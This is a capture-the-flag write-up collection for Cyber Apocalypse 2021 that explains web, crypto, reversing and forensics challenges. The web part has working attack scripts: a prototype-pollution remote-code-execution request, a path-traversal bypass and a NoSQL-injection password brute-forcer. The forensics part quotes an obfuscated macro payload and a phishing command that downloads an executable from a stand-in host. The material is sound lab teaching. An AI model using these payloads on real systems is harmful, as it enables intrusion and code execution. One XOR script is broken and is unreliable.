# Cyber Apocalypse CTF 2021 Writeups
Author: [Gallifrey](https://github.com/gall1frey)

### Contents
- [Web](#web)
    - [Inspector Gadget](#inspectorGadget)
    - [BlitzProp](#blitzProp)
    - [MiniSTRyplace](#miniSTRyplace)
    - [Caas](#caas)
    - [Wild Goose Hunt](#wildGooseHunt)
- [Crypto](#crypto)
    - [Nintendo Base64](#nintendoBase64)
    - [Phase Stream 1](#phaseStream1)
    - [Phase Stream 2](#phaseStream2)
    - [Phase Stream 3](#phaseStream3)
    - [Phase Stream 4](#phaseStream4)
    - [SoulCrabber](#soulCrabber)
    - [SoulCrabber2](#soulCrabber2)
- [Reversing](#rev)
    - [Authenticator](#authenticator)
    - [Passphrase](#passphrase)
- [Forensics](#forensics)
    - [Key mission](#keyMission)
    - [Invitation](#invitation)
    - [AlienPhish](#alienPhish)
- [Hardware](#hardware)
    - [Serial Logs](#serialLogs)
    - [Compromised](#compromised)
    - [Secure](#secure)
    - [Off The Grid](#offTheGrid)
- [Misc](#misc)
    - [Alien Camp](#alienCamp)
    - [Input as a Service](#inputAsAService)
    


# Web<a name="web"></a>
## Inspector Gadget<a name="inspectorGadget"></a>
### Solution
Was a very simple web chall. 
The web page already had the first part of the flag, ```CHTB{```. Viewing the source code got usthe next part, ```1nsp3ction_```.
Checking out the css file, we get the third part, ```c4n_r3ve4l```. Finally, checking out the main.js file gives us the last piece: ```us3full_1nf0rm4tion}```.

The flag is:
```
CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}
```

## BlitzProp<a name="blitzProp"></a>
```
A tribute page to the legendary alien band called BlitzProp!
```
The challenge came with the source code, ```web_blitzprop.zip```

On starting the docker container, we are greeted with a web page that asks us to enter a favourite song. If the entered field isn't a name of one of the songs listed, we get a response saying ```Please provide us with the name of an existing song.```

### Solution
Looking at the source code that handles this:
```javascript
router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
    const { song } = unflatten(req.body);

	if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the name of an existing song.'
		});
	}
});
```
We can see that the input is only being checked to see if it _contains_ that string. It means we can append other stuff to our input and it won't make a difference. 
Also, there is another line worth noting:
```javascript 'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })```
pug.compile converts a string into a template function and executes it. This is vulnerable. We can use AST injection to execute remote code. Also, according to the zip file, the file containing the flag is called ```flag```.

The attack:
```python
import requests

TARGET_URL = '<url of the target>'

# make pollution
r=requests.post(TARGET_URL + '/api/submit', json = {
    "song.name":"Not Polluting with the boys",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync('cat flag* > views/index.html')"
    }
})
# execute
print(requests.get(TARGET_URL).text)
```
The first part of the script overwrites ```index.html``` with the contents of the file ```flag```. So the next time we access ```index.html```, it prints out the contents of the file ```flag```.
```
CHTB{p0llute_with_styl3}
```

## MiniSTRyplace<a name="miniSTRyplace"></a>
```
Let's read this website in the language of Aliens. Or maybe not?
```
The challenge came with the source code, ```web_ministryplace.zip```
### Solution
On starting the docker container, we get ourselves a web page where you can choose the language. On checking out the source code file, index.php, we find something interesting:
```php
<html>
    <header>
        <meta name='author' content='bertolis, makelaris'>
        <title>Ministry of Defence</title>
        <link rel="stylesheet" href="/static/css/main.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.0/slate/bootstrap.min.css"   >
    </header>

    <body>
    <div class="language">
        <a href="?lang=en.php">EN</a>
        <a href="?lang=qw.php">QW</a>
    </div>

    <?php
    $lang = ['en.php', 'qw.php'];
        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
    ?>
    </body>
</html>
```
More importantly, the part 
```php  
        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : 
```
It basically gives us the file that maches the name set by ```lang```. We only have to specify the name of the flag file in ```lang```. 
But note that php replaces any string matching ```../``` with an empty string. 
So to get the contents of the file ```../../flag```, we'll have to set lang as ```....//....//flag```.
Sending a GET request with ```lang=....//....//flag```, we get the flag.

The flag is:
```
MiniSTRyPlace: CHTB{b4d_4li3n_pr0gr4m1ng}
```

## CaaS<a name="caas"></a>
```
cURL As A Service, or CAAS is a brand new Alien Application, built so that humans can test the status of their websites. However, it seems that the aliens have not quite got the hang of Human Programming and the application is riddled with issues.
```
The challenge came with the source code, ```web_caas.zip```
### Solution
On starting the docker, we get ourselves a web page where we enter a url, and the server returns the output of the curl command run for that url. There is also a check to see if the input is a valid url, but it is done on the client side, and can easily be bypassed.

On checking the source code, we have:
```php
    public function __construct($url)
    {
        $this->command = "curl -sL " . escapeshellcmd($url);
    }

    public function exec()
    {
        exec($this->command, $output);
        return $output;
    }
```
The escapeshellcmd() function escapes any possible characters that can be used to run shell commands. There are some bypasses for it, but it won't be necessary for this challenge. 
We can simply get the flag by passing ```file:///../../flag``` as input.
cURLing on the server's own fileserver gets us the flag.

The flag is:
```
CHTB{f1le_r3trieval_4s_a_s3rv1ce}
```

## Wild Goose Hunt<a name="wildGooseHunt"></a>
```
Outdated Aliwn technology has been found by the human resistance. The system may contain sensitive information thet could be of use to us. Our experts are trying to find a way into the system. Can you help?
```
The challenge came with the source code, ```web_wild_goose_hunt.zip```
### Solution
On starting the docker, and browsing it, we are asked for username and password.
The source code tells us that MongoDB is used. So NoSQL injection looks like a good start.

Intercepting the login response, we see that it looks like this:
```username=user&password=pass```
Trying a simple payload:
```json
{"username": {"$gt": ""}, "password": {"$gt": ""} }
```
This returns the message: ```{"logged":1,"message":"Login Successful, welcome back admin."}```
Now we know there's a user called admin.

We'll now have to guess the password. Writing a python script to do that:
```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://138.68.185.219:30775/api/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c.isalnum() or c == '_' or c == '}':
            payload='{"username": {"$eq":"'+username+'"}, "password": {"$regex": "^'+password+c+'" }}'
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if '1' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```
([Reference](https://book.hacktricks.xyz/pentesting-web/nosql-injection))
The flag is:
```
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
```

# Crypto<a name="crypto"></a>
## Nintendo Base64<a name="nintendoBase64"></a>
The challenge has a downloadable part, ```output.txt```
### Solution
Was a very simple chall. 
Looking at the file output.txt, we see it is an ASCII art, made of characters that seem to be base64. That perfectly lines up with the name of the challenge. Removing all the whitespaces and decoding base64 8 times, we get the flag:

The flag is:
```
CHTB{3nc0d1ng_n0t_3qu4l_t0_3ncrypt10n}
```

## Phase Stream 1<a name="phaseStream1"></a>
The challenge has a downloadable part, ```output.txt```
### Solution
The contents of the file output.txt look like hex. Hex is a good way to store encrypted data (base64 could be better ig) because sometimes the bytes in the encrypted data are not printable.
The challenge stated that the Aliens have used a repeating 5 byte key to XOR the data. 

We also know the first five characters of the flag, ```CHTB{```.

To get the key, we have to XOR the known plaintext with the first five bytes of the ciphertext.
Then, we can use the key to decrypt the whole flag.
Writing a python script to do that:
```python
inp = '2e313f2702184c5a0b1e321205550e03261b094d5c171f56011904'
inp = bytes.fromhex(inp) #convert the hex from output.txt to byte stream
ans = b'CHTB{' #known part of the flag, as bytes
key = []

for j in range(5):
	f = inp[j]
	for i in range(0,1000):
		if i^ans[j] == f:
			key.append(i)

flag = ''
for i in range(len(inp)):
	msg += chr(inp[i]^flag[i%5]) 
print(flag)

```
The flag is:
```
CHTB{u51ng_kn0wn_pl41nt3xt}
```

## Phase Stream 2<a name="phaseStream2"></a>
The challenge has a downloadable part, ```output.txt```
### Solution
This chall is similar to Phase Stream 1, except the file ```output.txt``` now contains 10000 lines of possible encrypted flag. One of them is the actual flag, 9999 of them are random letters.

We also know the first five characters of the flag, ```CHTB{```.

This time, we run a similar python script to check each of the 10000 lines for the flag.
```python
f = open('output.txt','r')
lines = f.readlines()
for i in range(len(lines)):
	lines[i] = lines[i].strip()
f.close()

flag = b'CHTB{'

condensed = []

for i in lines:
	res = bytes.fromhex(i)
	for j in range(100):
		for k in range(len(flag)+1):
			if k == len(flag):
				condensed.append((i,j))
				break
			if res[k]^j != flag[k]:
				break
	
print(condensed)
ans = ''
for i in condensed:
	for j in bytes.fromhex(i[0]):
		ans += chr(j^i[1])
print(ans)
```
Running it:
```shell
┌──(kali㉿kali)-[~/Documents/cyber_apocalypse/Crypto/PhaseStream2]
└─$ python3 sol.py              
[('060d11073e2b76762129761a742b1a711a2d713c363171262e38', 69)]
CHTB{n33dl3_1n_4_h4yst4ck}
```
Turns out line 69 has the encrypted flag.
The flag is:
```
CHTB{n33dl3_1n_4_h4yst4ck}
```

## Phase Stream 3<a name="phaseStream3"></a>
The challenge has a downloadable part, ```output.txt```, along with a script, ```phasestream3.py``` used for encryption.
### Solution
The encryption script looks like this:
```python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os

KEY = os.urandom(16)
print(KEY.hex())
print()
def encrypt(plaintext):
    cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128))
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()

def decrypt(plaintext):
    cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128))
    ciphertext = cipher.decrypt(plaintext)
    return ciphertext


test = b"No right of private conversation was enumerated in the Constitution. I don't suppose it occurred to anyone at the time that it could be prevented."
print(test.hex())
print()
print(encrypt(test))
print()
with open('flag.txt', 'rb') as f:
    flag = f.read().strip()
a = encrypt(flag)
print(a)
print(encrypt(decrypt(a).hex()))
```
First thing of note is that encryption is done using AES, with CTR mode. The most important thing while using AES in CTR mode is to _*NEVER*_ use the same key twice. But that has clearly been done here.
Second thing to note is that the key is 16 bits.

AES is a block cipher. But in CTR mode, each block is encrypted independent of others. That makes it basically a stream cipher. And if the same key has been used twice, it is vulnerable to a known plaintext attack. 
Writing a python script to decrypt the flag:
```python
from base64 import b64decode, b64encode

flag_file = bytes.fromhex("4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea") # The value to encrypt
known_plaintext = "No right of private conversation was enumerated in the Constitution. I don't suppose it occurred to anyone at the time that it could be prevented."
known_cipher_hex = "464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c" # The encrypted version of known_plaintext
known_cipher = bytes.fromhex(known_cipher_hex)

print("known_cipher length %d" % len(known_cipher))

key = bytearray()
for i in range(0, 32):
    key.append(known_cipher[i] ^ ord(known_plaintext[i]))

def encrypt(key, plaintext):
	ret = bytearray()
	for i in range(0,len(plaintext)):
		ret.append(key[i%len(key)]^plaintext[i])
	return ret

print("key " ,key.hex())

print(encrypt(key, flag_file))
```
The flag is:
```
CHTB{r3u53d_k3Y_4TT4cK}
```

## Phase Stream 4<a name="phaseStream4"></a>
The challenge has a downloadable part, ```output.txt```, along with a script, ```phasestream4.py``` used for encryption.
### Solution
The encryption script looks like this:
```python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os

KEY = os.urandom(16)


def encrypt(plaintext):
    cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128))
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()


with open('test_quote.txt', 'rb') as f:
    test_quote = f.read().strip()
print(encrypt(test_quote))

with open('flag.txt', 'rb') as f:
    flag = f.read().strip()
print(encrypt(flag))
```
This chall is similar to Phase Stream 3, except that we don't have a known plaintext.
However, something interesting to note:
```
PT1 XOR K = CT1
PT2 XOR K = CT2
Therefore, PT1 XOR PT2 = CT1 XOR CT2
```
The key gets cancelled out of the equation, and we don't have to deal with it. We only have to figure out what could the possible plaintext be. 
That wasn't a difficult task since we already know the first five characters of the flag: CHTB{
Writing a python script to decrypt the flag:
```python
f = open('output.txt')
ct,flag = f.readlines()
f.close()

#print(ct,flag)

ct = bytes.fromhex(ct.strip())
flag = bytes.fromhex(flag.strip())
print(len(flag))
xored = bytearray()
for i in range(len(ct)):
	if i < len(flag):
		xored.append(ct[i]^flag[i])
	else:
		xored.append(ct[i]^0)


known = b'CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attacks'
a = bytearray()
pt = ''
key = []
for i in range(len(flag)-1):
	if i < len(known):
		pt += chr(xored[i]^known[i])
		key.append(flag[i]^known[i])
	else:
		pt += '.'
pt += chr(xored[i]^b'}'[0])

print(key)
print(pt)

pt = b'I alone cannot change the world, but I can cast a stone across the water to create many'
flg = ''
for i in range(len(pt)):
	flg += chr(xored[i]^pt[i])

print(flg)
```
This isn't a great script, it barely got the job done. 
The script decrypts the known bits of the plaintext / flag. Then, I figured that the first plaintext was a proper sentence, and tried guessing words that could fit. Finally, I realised it was a quote from Mother Teresa. After plugging that into the script, I got the flag.
The flag is:
```
CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attacks}
```

## SoulCrabber<a name="soulCrabber"></a>
The challenge has a downloadable part, ```output.txt```, along with a rust code, ```main.rs``` used for encryption.
### Solution
The encryption script looks like this:
```rust
use rand::{Rng,SeedableRng};
use rand::rngs::StdRng;
use std::fs;
use std::io::Write;

fn get_rng() -> StdRng {
    let seed = 13371337;
    return StdRng::seed_from_u64(seed);
}

fn rand_xor(input : String) -> String {
    let mut rng = get_rng();
    return input
        .chars()
        .into_iter()
        .map(|c| format!("{:02x}", (c as u8 ^ rng.gen::<u8>())))
        .collect::<Vec<String>>()
        .join("");
}

fn main() -> std::io::Result<()> {
    let flag = fs::read_to_string("flag.txt")?;
    let xored = rand_xor(flag);
    println!("{}", xored);
    let mut file = fs::File::create("out.txt")?;
    file.write(xored.as_bytes())?;
    Ok(())
}
```
This encryption involves a key generated by a random number generator. But the thing about random number generators is that with the same generator and the same seed, the series of random numbers generated can be reproduced. To decrypt the flag, all we need to do is xor the bytes in the ciphertext with the same random number sequence as generated before. That is an easy task since we already know the seed (13371337), and the random number generator used.

The flag is:
```
CHTB{mem0ry_s4f3_crypt0_f41l}
```

## SoulCrabber2<a name="soulCrabber2"></a>
The challenge has a downloadable part, ```output.txt```, along with a rust code, ```main.rs``` used for encryption.
### Solution
This is a challenge I solved right after the CTF ended, and I'm very bitter about it.
The encryption script looks like this:
```rust
use rand::{Rng,SeedableRng};
use rand::rngs::StdRng;
use std::fs;
use std::io::Write;
use std::time::SystemTime;

fn get_rng() -> StdRng {
    let seed = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .expect("Time is broken")
        .as_secs();
    return StdRng::seed_from_u64(seed);
}

fn rand_xor(input : String) -> String {
    let mut rng = get_rng();
    return input
        .chars()
        .into_iter()
        .map(|c| format!("{:02x}", (c as u8 ^ rng.gen::<u8>())))
        .collect::<Vec<String>>()
        .join("");
}

fn main() -> std::io::Result<()> {
    let flag = fs::read_to_string("flag.txt")?;
    let xored = rand_xor(flag);
    println!("{}", xored);
    let mut file = fs::File::create("out.txt")?;
    file.write(xored.as_bytes())?;
    Ok(())
}
```
This chall is similar to SoulCrabber, except this time the seed is not explicitly mentioned. The solution goes the same way, except we have to now bruteforce the seed.
The seed is a UNIX timestamp, in seconds. So we have to create a loop starting with the current timestamp as the seed, and decrementing one till we have the correct seed.
This might take a while, but it gets there.
The flag is:
```
CHTB{cl4551c_ch4ll3ng3_r3wr1tt3n_1n_ru5t}
```

# Reversing<a name="rev"></a>
## Authenticator<a name="authenticator"></a>
The chall came with an executable, ```authenticator```
### Solution
Running the executable, we find it asks us for an Alien ID. We don't know that.
Disassembling the file using IDA, we get the ID, that's 11337. 
Entering that, we are asked for a pin. We don't know that either. Looking through the disassembled file in IDA, we come across a ```checkpin``` function.
There is a string in the checkpin function which could be the flag, except it looks like gibberish. 
```}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:```
Looking further, we see that before comparing the input pin, this string is XORed with 9. So most probably, this is an encrypted flag, and the key is 9.
XORing each character of that string with 9, we get the flag: ```th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3```
The flag is:
```
CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}
```

## Passphrase<a name="passphrase"></a>
The chall came with an executable, ```passphrase```
### Solution
Running the executable, it asks us for a passphrase. And in case of a wrong passphrase, it exits out.
Disassembling the file using gdb:
First, we disassemble main. 
We find some instructions moving data to the stack.
Let's check out the stack using ```x/200c $sp```
This gives us the flag
The flag is:
```
CHTB{3xtr4t3rR3stR14L5_VS_hum4n5}
```

# Forensics<a name="forensics"></a>
## Key Mission<a name="keyMission"></a>
The challenge came with a pcap file, ```key_mission.pcap```
### Solution
The pcap file contained a lot of messages between the IP addresses ```3.2.0``` and ```3.2.1```. The protocol used was USB. Quick googling got me to a previous CTF chall that was similar to this.
Using the [USB Keyboard Parser](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser), we get the flag.
The flag is:
```
CHTB{a_plac3_fAr_fAr_away_fr0m_earth}
```

## Invitation<a name="invitation"></a>
The challenge came with a word file, ```invitation.docx```
### Solution
Looking through the word file, we see that it has macros enabled. Upon analyzing the macros, we find that there are a lot of functions, and they print a base64 code. Upon decoding and analyzing it, we come across one bit of interesting code:
```SEt ("G8"+"h")  (  " ) )63]Rahc[,'raZ'EcalPeR-  43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . "  ) ;-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue[ - 1.. - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue.LengtH)] | IeX ```
Some of this code is reversed, and there are some regex functions applied. Decoding that, we get the flag.
The flag is:
```
CHTB{maldocs_are_the_new_meta}
```

## AlienPhish<a name="alienPhish"></a>
The challenge came with a ppt file, ```Alien Weaknesses.pptx```
### Solution
Analyzing this file on anyrun, we find that one of the elements on the title slide have an onclick action set, that runs commands on the command prompt.
From there, we get the command,
```cmd.exe /V:ON/C"set yM="o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'   pmet:vne$ = o$" c- llehsrewop&&for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&&if %X leq 0 call %kCX:*kCX!=%"```
On analyzig the text in reverse, we see that it was running another command on Powershell. The command being: ```powershell -c "$o = $env:temp   'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o```.
Decoding from base64 the name of the exe file, we get the flag.
The flag is:
```
CHTB{pH1sHiNg_w0_m4cr0s???}
```
